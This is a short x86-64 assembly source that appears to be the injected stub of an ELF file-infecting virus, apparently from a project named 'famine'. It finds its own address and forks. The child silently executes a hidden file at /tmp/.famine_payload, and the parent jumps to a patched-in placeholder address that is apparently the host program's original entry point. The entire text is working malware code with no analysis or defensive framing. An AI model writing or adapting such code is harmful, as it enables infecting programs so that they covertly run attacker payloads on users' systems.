BITS 64

call path
path:
	pop rbx
	mov r14, rdx
	lea rdi, [rbx + 0x2a]
	push 0
	push rdi
	mov rsi, rsp
	xor edx, edx
	mov al, 57
	syscall
	test rax, rax
	jne parent
	mov al, 59
	syscall
parent:
	add rsp, 0x10
	mov rdx, r14
	add rbx, 0xDEADBEEF
	jmp rbx
payload_path:
	db "/tmp/.famine_payload", 0
